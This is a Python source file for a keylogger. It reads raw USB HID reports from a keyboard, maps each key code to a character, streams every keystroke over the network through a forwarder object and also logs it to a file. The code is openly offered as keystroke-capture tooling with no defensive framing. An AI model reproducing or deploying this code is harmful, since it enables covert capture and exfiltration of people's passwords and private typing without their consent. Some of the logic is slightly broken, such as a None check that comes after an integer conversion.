import logging
import usb.core, usb.util
from src.DataHandler import DataHandler
from src.Forwarder import Forwarder
import hid


class NoDeviceFound(Exception):
    def __init__(self, devices: list = []):
        super().__init__(f"No forward device found in {devices}")


class KeyLogger:
    __slots__ = ["__devices", "data_handler", "__forwarder", "keyboard_layout"]

    def __init__(
            self,
            keyboard_layout: dict[int, list[int, int]],
            data_handler: DataHandler,
            forwarder: Forwarder,
    ) -> None:
        # get all USB Devices
        self.__devices: list[int, int] = self.get_devices()
        # create a data handler
        self.data_handler = data_handler
        # create a forwarder
        self.__forwarder = forwarder
        # set keyboard
        self.keyboard_layout: dict[int, list[int, int]] = keyboard_layout

    def __del__(self):
        pass

    @staticmethod
    def get_devices() -> list[[int, int]]:
        devices = usb.core.find(find_all=True)
        found_devices: list[[int, int]] = []
        # Enumerate over all USB devices
        for device in devices:
            print(device)
            try:
                found_devices.append([device.idVendor, device.idProduct])
            except usb.core.USBError as e:
                print(f"Error reading Vendor ID: {e}")
        return found_devices

    def run(self, id_vendor: int = 0x1C4F, device_id: int = 0x008B):
        keyboard = hid.device()
        keyboard.open(id_vendor, device_id)
        while True:
            try:
                data = keyboard.read(8)  # Read an 8-byte HID report
            except OSError:
                logging.error("Keyboard no longer connected")
                # close all network sockets
                self.__forwarder.__del__()
                exit()
            if data:
                key_code = data[2]  # The key code is in byte
                uppercase: bool = True
                if data[0] == 2:
                    uppercase = False
                try:
                    # release the key:
                    if self.keyboard_layout[str(key_code)] == [None, None]:
                        continue
                    offset: int = int((lambda u: u[0] if uppercase else u[1])(self.keyboard_layout[str(key_code)]))
                    if offset is None:
                        continue
                except KeyError:
                    logging.error(f"Key {key_code} not in the layout")
                    continue
                char: chr = chr(offset + key_code)
                try:
                    self.__forwarder.send_over_network(data=char)
                    # write data in file
                    self.data_handler.write(f"{key_code} {char}")
                except ConnectionResetError:
                    self.__forwarder.listen()
